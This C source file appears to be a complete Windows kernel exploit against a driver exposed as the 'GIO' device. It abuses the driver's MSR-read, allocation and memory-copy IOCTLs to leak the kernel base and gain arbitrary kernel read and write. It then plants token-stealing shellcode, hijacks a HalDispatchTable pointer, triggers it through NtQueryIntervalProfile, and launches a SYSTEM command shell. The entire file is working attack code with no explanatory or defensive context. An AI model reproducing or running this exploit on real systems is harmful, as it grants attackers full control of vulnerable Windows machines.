#include <windows.h>
#include <stdio.h>

#define IOCTL_READMSR 0xC3502580
#define IOCTL_ALLOC 0xC3502800
#define IOCTL_COPY 0xC3502808

#define REGISTER_LSTAR 0xC0000082
#define OFFSET_KiSystemCall64 0x42a580

#define QWORD ULONGLONG

typedef struct CopyData {
    QWORD DstAddress;
    QWORD SrcAddress;
    DWORD Size;
} CopyData;

typedef struct MSRData {
	DWORD Type;
	DWORD Register;
	QWORD Value;
} MSRData;

typedef NTSTATUS(WINAPI *NtQueryIntervalProfile_t) (
    IN ULONG ProfileSource,
    OUT PULONG Interval
);

NtQueryIntervalProfile_t NtQueryIntervalProfile = (NtQueryIntervalProfile_t) GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQueryIntervalProfile");

BYTE tokenStealing[60] = {
    0x65, 0x48, 0x8b, 0x14, 0x25, 0x88, 0x01, 0x00, 0x00, // mov rdx, [gs:0x188]              ; $rdx = _KTHREAD
    0x48, 0x8b, 0x82, 0xb8, 0x00, 0x00, 0x00,             // mov rax, [rdx + 0xb8]            ; $rax = _EPROCESS
    0x50, 0x5b,                                           // mov rbx, rax                     ; $rbx = _EPROCESS
													      // .loop:
    0x48, 0x8b, 0x9b, 0x48, 0x04, 0x00, 0x00,             //     mov rbx, [rbx + 0x448]       ; $rbx = ActiveProcessLinks
    0x48, 0x81, 0xeb, 0x48, 0x04, 0x00, 0x00,             //     sub rbx, 0x448               ; $rbx = _EPROCESS
    0x48, 0x83, 0xbb, 0x40, 0x04, 0x00, 0x00, 0x04,       //     cmp qword [rbx + 0x440], 0x4 ; cmp PID to SYSTEM PID
    0x75, 0xe8,                                           //     jnz .loop                    ; if zf == 0 -> loop
    0x48, 0x8b, 0x8b, 0xb8, 0x04, 0x00, 0x00,             // mov rcx, [rbx + 0x4b8]           ; $rcx = SYSTEM token
    0x80, 0xe1, 0xf0,                                     // and cl, 0xf0                     ; clear _EX_FAST_REF struct
    0x48, 0x89, 0x88, 0xb8, 0x04, 0x00, 0x00,             // mov [rax + 0x4b8], rcx           ; store SYSTEM token in _EPROCESS
    0xc3                                                  // ret                              ; return
};

VOID ArbitraryWrite(HANDLE hDevice, QWORD what, QWORD where, DWORD size) {
    CopyData userData;

    userData.DstAddress = where;
    userData.SrcAddress = what;
    userData.Size = size;

    DeviceIoControl(hDevice, IOCTL_COPY, (LPVOID) &userData, (DWORD) sizeof(struct CopyData), NULL, 0, NULL, NULL);
}

QWORD ArbitraryRead(HANDLE hDevice, QWORD where) {
    QWORD output;
    CopyData userData;

    userData.DstAddress = (QWORD) &output;
    userData.SrcAddress = where;
    userData.Size = 8;

    DeviceIoControl(hDevice, IOCTL_COPY, (LPVOID) &userData, (DWORD) sizeof(struct CopyData), NULL, 0, NULL, NULL);

    return output;
}

QWORD ReadMSR(HANDLE hDevice, DWORD reg) {
    QWORD output[2];
    MSRData userData;

    userData.Type = 1;
    userData.Register = reg;

    DeviceIoControl(hDevice, IOCTL_READMSR, (LPVOID) &userData, sizeof(struct MSRData), (LPVOID) output, sizeof(output), 0, NULL);

    return output[1];
}

QWORD AllocRWX(HANDLE hDevice, DWORD size) {
    DWORD input = size;
    QWORD output[2];

    DeviceIoControl(hDevice, IOCTL_ALLOC, (LPVOID) &input, sizeof(input), (LPVOID) output, sizeof(output), 0, NULL);

    return output[0];
}

QWORD GetHalDispatchTable(QWORD kernelBase) {
    HMODULE hKernel = LoadLibraryA("C:\\Windows\\System32\\ntoskrnl.exe");

    QWORD userHalDispatchTable = (QWORD) GetProcAddress(hKernel, "HalDispatchTable");
    QWORD offsetHalDispatchTable = userHalDispatchTable - (QWORD) hKernel;
    QWORD kernelHalDispatchTable = kernelBase + offsetHalDispatchTable;

    FreeLibrary(hKernel);
    return kernelHalDispatchTable;
}

int main() {
    HANDLE hDevice = CreateFileA("\\\\.\\GIO", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);

    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to get handle: 0x%x\n", GetLastError());
        exit(EXIT_FAILURE);
    }

    QWORD KiSystemCall64 = ReadMSR(hDevice, REGISTER_LSTAR);
    QWORD kernelBase = KiSystemCall64 - OFFSET_KiSystemCall64;

    QWORD kernelHalDispatchTable = GetHalDispatchTable(kernelBase);
    QWORD backupHalPointer = ArbitraryRead(hDevice, kernelHalDispatchTable + 0x8);

    QWORD shellcode = AllocRWX(hDevice, sizeof(tokenStealing));
    ArbitraryWrite(hDevice, (QWORD) &tokenStealing, shellcode, sizeof(tokenStealing));
    ArbitraryWrite(hDevice, (QWORD) &shellcode, kernelHalDispatchTable + 0x8, 0x8);

    DWORD interval;
    NtQueryIntervalProfile(0x10, &interval);
    system("cmd.exe");

    ArbitraryWrite(hDevice, (QWORD) &backupHalPointer, kernelHalDispatchTable + 0x8, 0x8);
    CloseHandle(hDevice);
}
